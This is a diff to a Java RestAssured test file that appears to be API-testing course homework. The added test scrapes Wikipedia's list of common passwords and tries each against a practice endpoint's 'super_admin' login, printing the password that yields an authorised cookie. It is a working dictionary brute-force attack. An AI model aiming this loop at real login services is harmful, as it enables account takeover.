@@ -1,9 +1,13 @@
 import io.restassured.path.json.JsonPath;
+import io.restassured.path.xml.XmlPath;
 import org.junit.jupiter.api.Test;
 import io.restassured.RestAssured;
 import io.restassured.response.Response;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
-
+import java.util.stream.Collectors;
 
 
 public class HomeWorkTest {
@@ -119,5 +123,44 @@ public class HomeWorkTest {
     @Test
     public void lesson2Ex9() {
 
+        //Getting passwords
+        Response response = RestAssured
+                .get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+                .andReturn();
+
+        XmlPath xmlPath = new XmlPath(XmlPath.CompatibilityMode.HTML,response.asString());
+        List<String> passwords = xmlPath.getList("**.findAll { it.@class == 'wikitable'}[1].tbody.tr.td");
+        List<String> dedupedPasswords = passwords.stream().distinct().collect(Collectors.toList());
+
+        for (String password : dedupedPasswords) {
+            password = password.replaceAll("\n", "");
+            Map<String,String> authData = new HashMap<>();
+            authData.put("login", "super_admin");
+            authData.put("password", password);
+
+
+            response = RestAssured
+                    .given()
+                    .body(authData)
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String coockie = response.getCookie("auth_cookie");
+
+
+            response = RestAssured
+                    .given()
+                    .cookie("auth_cookie", coockie)
+                    .when()
+                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+
+            String responsePhrase = response.body().asString();
+            if (!responsePhrase.equals("You are NOT authorized")) {
+                System.out.println(password);
+                System.out.println(responsePhrase);
+                break;
+            }
+        }
     }
 }
